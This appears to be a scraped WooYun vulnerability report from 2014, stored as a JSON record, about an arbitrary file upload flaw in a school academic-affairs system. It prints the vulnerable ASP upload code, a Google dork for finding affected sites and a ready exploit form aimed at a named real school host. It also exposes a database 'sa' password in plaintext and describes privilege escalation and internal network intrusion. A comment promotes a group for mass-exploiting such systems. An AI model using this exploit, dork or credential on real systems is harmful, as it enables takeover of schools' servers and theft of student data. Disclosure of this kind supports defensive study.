{"id": 51467, "wybug_id": "wooyun-2014-074367", "wybug_title": "强智教务系统通杀Getshell(提权服务器内网渗透)", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "xlz0iza1", "wybug_date": "2014-08-29 18:43", "wybug_open_date": "2014-11-27 18:44", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-06：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-27：\t细节向公众公开  简要描述： RT 详细说明：  关键词:inurl:ShowGGTZ.asp?GGTZID=\n\n文件：jwgl\\jcxx\\savetofile.asp\n<%OPTION EXPLICIT%><!--#include FILE=\"upfile_class.asp\"--><%server.ScriptTimeout =10000000dim upfile,formPath,ServerPath,FSPath,formName,FileName,oFileset upfile=new upfile_class ''建立上传对象upfile.GetData (10240000)   '取得上传数据,限制最大上传10M%><html><head><title>文件上传 - 长沙市强科技发展有限责任公司·版权所有</title><style type=\"text/css\"><!--.p9{ font-size: 9pt; font-family: 宋体 }--></style><meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"></head><body leftmargin=\"20\" topmargin=\"20\" class=\"p9\"><p class=\"tx1\"><font color=\"#0000FF\" size=\"1\"></font></p><hr size=1 noshadow width=300 align=left><%if upfile.err > 0 then  '如果出错    select case upfile.err\tcase 1\tResponse.Write \"你没有上传数据呀???是不是搞错了??\"\tcase 2\tResponse.Write \"你上传的文件超出我们的限制,最大10M\"\tend select\telse%><table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" bordercolor=\"#000000\" class=\"p9\" style=\"border-collapse: collapse\">  <tr bgcolor=\"#CCCCCC\">     <td height=\"25\" valign='middle'>　本地文件　</td>    <td  valign='middle'>　大小(字节)　</td>    <td  valign='middle'>　上传到　</td>  </tr>  <%\tFSPath=GetFilePath(Server.mappath(\"upfile.asp\"),\"\\\")'取得当前文件在服务器路径\tServerPath=GetFilePath(Request.ServerVariables(\"HTTP_REFERER\"),\"/\")'取得在网站上的位置\tfor each formName in upfile.file '列出所有上传了的文件\t   set oFile=upfile.file(formname)\t   FileName=upfile.form(formName)'取得文本域的值\t   if not FileName>\"\" then  FileName=oFile.filename'如果没有输入新的文件名,就用原来的文件名\t   oFile.SaveToFile FSPath&FileName   ''保存文件\t %><tr>     <td  valign=\"middle\" align = \"left\" height=\"20\"><%=oFile.FilePath&oFile.FileName%></td>    <td  valign=\"middle\" align = \"center\"><%=oFile.filesize%></td>    <td  valign=\"middle\" align = \"center\"><A HREF=\"<%=serverpath&FileName%>\" title = \"<%=serverpath&FileName%>\"><%=FileName%></A></td>  </tr><%\t set oFile=nothing\tnext%>  <tr>     <td colspan=\"3\" height=\"25\" valign='middle'>　一共上传了<%=upfile.file.Count%>个文件</td>  </tr><%end ifset upfile=nothing  '删除此对象%></table><p></p></p>[<a href=\"javascript:history.back();\">返回</a>]</body></html><%function GetFilePath(FullPath,str)  If FullPath <> \"\" Then    GetFilePath = left(FullPath,InStrRev(FullPath, str))    Else    GetFilePath = \"\"  End IfEnd function%>\n利用exp:\n<form method=\"post\" name=\"form1\" action=\"http://e.tjmvti.cn/jwgl/jcxx/savetofile.asp\" enctype=\"multipart/form-data\">  <table border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\">    <tr>       <td><div align=\"center\"><font color=\"#0000ff\" size=\"4\"><b>exp</b></font></div></td>    </tr>    <tr>       <td><table width=\"100%\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"0\" bordercolor=\"#111111\" style=\"BORDER-COLLAPSE: collapse\">          <tr>             <td height=\"27\" width=\"100\" colspan=\"5\">　&nbsp;            </td>          </tr>          <tr>             <td width=\"750\" colspan=\"5\"> <div id=\"uptd\"> </div></td>          </tr>          <tr> \t    <td height=\"30\" align=\"middle\" width=\"50\">\t      <input type=file name=uploadfile size=\"100\">\t    </td>            <td height=\"30\" align=\"middle\" width=\"100\">               <p align=\"center\">               <input type=\"submit\" name=\"Button2\" class=\"bt\" value=\"上传\">            </td>            <td height=\"30\" align=\"middle\" width=\"100\">             </td>          </tr>        </table></td>    </tr>  </table>  </form>\n   漏洞证明：  直接用exp.html任意文件上传，服务器几乎是sa权限，提权都是妥妥的，随便打个比方吧。\n\n配置文件：\nconn\\connstring.asp<!--#include file=\"../../connstring.asp\"--><%'以上代码严禁删除ServerName=Request.ServerVariables(\"Server_Name\")ProgramName =\"jwgl\"SName = \"10.0.0.1\"DBName = \"TJMTI\"DBBackDirName = \"Dbback\" if ProgramName =\"\" then     ServerNameProgramName = ServerName else     ServerNameProgramName= ServerName & \"/\" & ProgramName  end if          if Connstring = \"\" then connstring=\"driver={sql server};server=\" & Sname & \";database=\" & DBName & \";uid=sa;pwd=qzdatasoft123456789\"  '数据库连接语句  %>管理员还是蛮聪明的，数据和服务分离的，但是这给后来的内网渗透带来了极大的危害、\n服务器自己带的Serv-U Exec >>提权。\n\n\n\n\n\n可以看到，服务器都成为马蜂窝了，威胁还不只这么一点哦。\n关键语句：if Connstring = \"\" then connstring=\"driver={sql server};server=\" & Sname & \";database=\" & DBName & \";uid=sa;pwd=qzdatasoft123456789\"\n直接提权10.0.0.1服务器。\n\n\n\n\n\n好吧，下面是其他案例截图吧。\n\n\n\n   修复方案：  狗哥这还走小厂商吗？   版权声明：转载请注明来源 xlz0iza1@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2014-09-03 10:36 厂商回复： 已经转报给教育网应急组织。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-03 17:56 |    \t\twellsun \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | www.wellsun.com)\t\t \n  欢迎大家加入通杀教务系统漏洞QQ 群： 310068074    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}